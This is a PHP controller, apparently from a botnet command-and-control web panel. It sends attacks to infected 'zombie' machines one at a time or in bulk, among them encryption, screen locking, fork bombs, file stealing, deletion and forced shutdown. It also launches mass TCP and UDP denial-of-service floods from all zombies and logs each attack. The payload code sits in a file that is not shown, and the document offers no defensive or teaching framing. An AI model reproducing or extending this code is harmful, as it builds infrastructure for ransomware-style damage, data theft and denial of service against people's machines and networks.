<?php
require_once 'vue_attaques.php';
require_once 'modele_attaques.php';

class ContAttaque
{

    function __construct()
    {
        $this->modele = new ModeleAttaque();
        $this->vue = new VueAttaque();
    }


    public function attaque_cible_zombie()
    {
        switch ($_POST['choix_attaque']) {
            case "Autorun":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Delfile":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Delprefetch":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
             case "Encrypt":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "File_stealing":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Forkbomb":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Hardcollect":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Lock":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Image":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Logoff":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;            
            case "Restart":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;              
            case "Shutdown":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;
            case "Song":
                $ip = $this->modele->getIP($_POST['choix_zombie']);
                $this->modele->attaque($_POST['choix_attaque'], $ip[0][0]);
                $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ip[0][0], 1);
                header("Location: http://localhost/donnees/attaques/");
                break;            
            default:
                break;
        }   
     }

     public function attaque_massive_zombie()
     {
         switch ($_POST['choix_attaque']) {
             case "Autorun":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Delfile":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                  //  $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Delprefetch":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
              case "Encrypt":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "File_stealing":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
           //         $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Forkbomb":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Hardcollect":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
           //         $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Lock":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Image":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Logoff":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;    
             case "Restart":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;    
             case "Shutdown":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {          
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             case "Song":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0);
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;        
             default:
                 break;
         }   
      }

      public function attaque_massive_victime()
      {
          switch ($_POST['choix_attaque']) {
              case "DDOS_TCP":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {   
                    $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                    $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0, "EN COURS");
                    $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
              case "DDOS_UDP":
                $ips = $this->modele->getIPs();
                $i = 0;

                foreach ($ips as $ip) {             
                  $this->modele->attaque($_POST['choix_attaque'], $ips[$i][0]);
                  $this->modele->enregistrerAttaque($_POST['choix_attaque'], $ips[$i][0], 0, "EN COURS");
                  $i++;
                }
               
                 header("Location: http://localhost/donnees/attaques/");
                 break;
             default:
                  break;
          }   
       }
 


      public function choixAttaqueCibleeZombie()
      {
          $attaques_zombies = $this->modele->getAttaquesZombies();
          $zombies = $this->modele->getZombies();
          $this->vue->choixAttaqueCibleeZombie($attaques_zombies, $zombies);
      }

	public function choixAttaqueCibleeVictime()
    {
        $attaques_victimes = $this->modele->getAttaquesVictimes();
        $this->vue->choixAttaqueCibleeVictime($attaques_victimes);
        
    }


    public function choixAttaqueMassiveZombie()
    {
        $attaques_zombies = $this->modele->getAttaquesZombies();
        $this->vue->choixAttaqueMassiveZombie($attaques_zombies);
    }

    public function choixAttaqueMassiveVictime()
    {
        $attaques_victimes = $this->modele->getAttaquesVictimes();
        $this->vue->choixAttaqueMassiveVictime($attaques_victimes);
    }



}